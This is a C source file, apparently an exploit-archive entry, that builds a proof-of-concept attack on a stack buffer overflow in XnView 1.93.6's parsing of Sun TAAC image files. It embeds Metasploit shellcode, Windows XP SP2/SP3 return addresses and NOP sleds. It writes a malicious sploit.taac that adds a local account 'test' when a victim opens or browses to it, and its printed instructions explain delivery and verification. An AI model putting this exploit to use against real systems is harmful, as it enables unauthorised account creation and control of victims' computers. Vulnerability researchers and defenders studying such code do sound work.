#include <stdio.h>
#include <stdlib.h>
/*
 XnView 1.93.6 for Windows .taac buffer overflow proof of concept.
 
The vulnerability is caused due to a boundary error when processing
the "format" keyword of Sun TAAC files. This can be exploited to
cause a stack-based buffer overflow by e.g. tricking a user into
viewing a specially crafted Sun TAAC file.

Vulnerability discoverd by Secunia research http://secunia.com/secunia_research/2008-24/advisory/

Exploit code by Shinnok

This poc will create a "special" .taac file that when opened or viewed in XnView 1.93.6 for Windows 
will cause a buffer overflow and add an user "test" with password "test".
Tested on Windows XP sp2&sp3.

greetz to escalation666
/*

/* win32_adduser -  PASS=test EXITFUNC=seh USER=test Size=232 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char scode[] =
"\x2b\xc9\x83\xe9\xcc\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xbf"
"\x93\x8f\x1e\x83\xeb\xfc\xe2\xf4\x43\x7b\xcb\x1e\xbf\x93\x04\x5b"
"\x83\x18\xf3\x1b\xc7\x92\x60\x95\xf0\x8b\x04\x41\x9f\x92\x64\x57"
"\x34\xa7\x04\x1f\x51\xa2\x4f\x87\x13\x17\x4f\x6a\xb8\x52\x45\x13"
"\xbe\x51\x64\xea\x84\xc7\xab\x1a\xca\x76\x04\x41\x9b\x92\x64\x78"
"\x34\x9f\xc4\x95\xe0\x8f\x8e\xf5\x34\x8f\x04\x1f\x54\x1a\xd3\x3a"
"\xbb\x50\xbe\xde\xdb\x18\xcf\x2e\x3a\x53\xf7\x12\x34\xd3\x83\x95"
"\xcf\x8f\x22\x95\xd7\x9b\x64\x17\x34\x13\x3f\x1e\xbf\x93\x04\x76"
"\x83\xcc\xbe\xe8\xdf\xc5\x06\xe6\x3c\x53\xf4\x4e\xd7\x63\x05\x1a"
"\xe0\xfb\x17\xe0\x35\x9d\xd8\xe1\x58\xf0\xe2\x7a\x91\xf6\xf7\x7b"
"\x9f\xbc\xec\x3e\xd1\xf6\xfb\x3e\xca\xe0\xea\x6c\x9f\xe7\xea\x6d"
"\xcb\xb3\xfb\x7b\xcc\xe7\xaf\x31\xfe\xd7\xcb\x3e\x99\xb5\xaf\x70"
"\xda\xe7\xaf\x72\xd0\xf0\xee\x72\xd8\xe1\xe0\x6b\xcf\xb3\xce\x7a"
"\xd2\xfa\xe1\x77\xcc\xe7\xfd\x7f\xcb\xfc\xfd\x6d\x9f\xe7\xea\x6d"
"\xcb\xb3\xa0\x5f\xfb\xd7\x8f\x1e";


unsigned char ra_sp2[] = "\xed\x1e\x94\x7c";
unsigned char ra_sp3[] = "\x83\xbf\x8a\x5b";

unsigned char nops1[257]; //256 * \x90
unsigned char nops2[21]; //20 * \x90

int main(int argc, char **argv)
{
    int i;
    FILE* f;
    printf("[+] XnView 1.93.6 for Windows .taac buffer overflow\n");
	printf("[+] Discovered by Secunia : \nhttp://secunia.com/secunia_research/2008-24/advisory/\n");
	printf("[+] Coded by Shinnok, greetz to escalation666.\n");
    if ((argc!=2)||((atoi(argv[1])!=0)&&(atoi(argv[1])!=1))){
            printf("Usage: %s target\n",argv[0]);
            printf("Where target is:\n");
            printf("0: WinXP SP2\n");
            printf("1: WinXP SP3\n");
            printf("Successfull exploitation will result in the adding of user \"test\" with password \"test\".\n");
            return EXIT_SUCCESS;
    }
    for(i=0;i<256;i++) nops1[i]='\x90';
    nops1[256]='\0';
    for(i=0;i<14;i++) nops2[i]='\x90';
    nops2[20]='\0';
    if(atoi(argv[1])==0) {
        f=fopen("sploit.taac","wb");    
        fprintf(f,"ncaa%crank=2;%cbands=3;%csize=125 123;%c",'\xa','\xa','\xa','\xa');
        fprintf(f,"format=%s%s%s%s;%c",nops1,ra_sp2,nops2,scode,'\xa');
    }else{
        f=fopen("sploit.taac","wb");    
        fprintf(f,"ncaa%crank=2;%cbands=3;%csize=125 123;%c",'\xa','\xa','\xa','\xa');
        fprintf(f,"format=%s%s%s%s;%c",nops1,ra_sp3,nops2,scode,'\xa');               
    }                         
    fclose(f);
    printf("sploit.taac created!\n");
    printf("Now open sploit.taac in XnView or browse from it to the folder containing sploit.taac.\n");
    printf("Then check with \"net user\" or from control panel for the user account test.\n");
    return EXIT_SUCCESS;
}
